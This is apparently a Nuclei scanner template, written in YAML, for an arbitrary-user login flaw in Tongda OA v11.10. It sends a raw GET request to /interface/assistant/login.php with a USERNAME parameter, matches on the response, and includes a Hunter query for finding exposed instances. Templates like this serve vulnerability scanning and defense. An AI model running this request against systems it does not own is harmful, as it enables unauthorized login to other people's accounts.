http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - code
            - info
            - data
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /interface/assistant/login.php?USERNAME=1 HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5650.206 Safari/537.36
          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
          Accept-Encoding: gzip, deflate
          Accept-Language: zh-CN,zh;q=0.9
          Connection: close
id: tongda-oa-interface-assistant-userlogin
info:
    author: T4y1oR
    description: 通达OA v11.10 assistant 任意用户登录漏洞，爆破USERNAME值对应的user_name用户，使用空密码登录。
    metadata:
        hunter-query: app.name="通达 OA"
        verified: true
    name: tongda-oa-interface-assistant-userlogin
    severity: high
    tags:
        - tongda
        - userlogin
